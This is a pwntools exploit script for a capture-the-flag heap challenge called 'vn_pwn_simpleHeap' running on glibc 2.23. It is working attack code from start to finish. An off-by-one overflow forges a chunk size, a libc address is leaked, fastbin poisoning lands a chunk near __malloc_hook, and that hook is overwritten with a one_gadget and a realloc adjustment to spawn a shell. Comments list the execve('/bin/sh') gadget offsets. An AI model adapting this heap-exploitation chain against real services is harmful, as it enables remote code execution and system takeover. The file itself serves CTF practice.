from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])



io=process("./vn_pwn_simpleHeap")
# io=remote("node4.buuoj.cn",28385)
elf=ELF("./vn_pwn_simpleHeap")
libc=ELF("./libc-2.23.so")

def add(n,c):
    io.sendlineafter("choice: ",b"1")
    io.sendlineafter("size?",str(n))
    io.sendafter("content:",c)

def edit(n,c):
    io.sendlineafter("choice: ",b"2")
    io.sendlineafter("idx?",str(n))
    io.sendlineafter("content:",c)

def show(n):
    io.sendlineafter("choice: ",b"3")
    io.sendlineafter("idx?",str(n))

def delete(n):
    io.sendlineafter("choice: ",b"4")
    io.sendlineafter("idx?",str(n))


add(0x18,b"qqq") #0
add(0x40,b"www") #1
add(0x60,b"eee") #2
add(0x10,b"sss") #3


payload=cyclic(0x18)+p64(0xc1)
edit(0,payload)


delete(1)
add(0x40,b"wqw")
show(2)

leak_addr=u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
print("leak_addr:  "+hex(leak_addr))
libc_addr=leak_addr-0x58-0x3C4B20
malloc_hook=libc_addr+libc.sym[b"__malloc_hook"]
realloc=libc_addr+libc.sym[b"__libc_realloc"]
one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
# one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=one_gadget[1]+libc_addr

add(0x60,b"wwwee") #4 2
delete(4)

payload=p64(malloc_hook-0x23)
edit(2,payload) 
add(0x60,b"mmm") #4


payload=cyclic(0xb)+p64(shell)+p64(realloc+0xc)
add(0x60,payload) #5

gdb.attach(io)
pause()

# add(0x30,b"aaa")
io.sendlineafter("choice: ",b"1")
io.sendlineafter("size?",b"1")

io.interactive()


# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

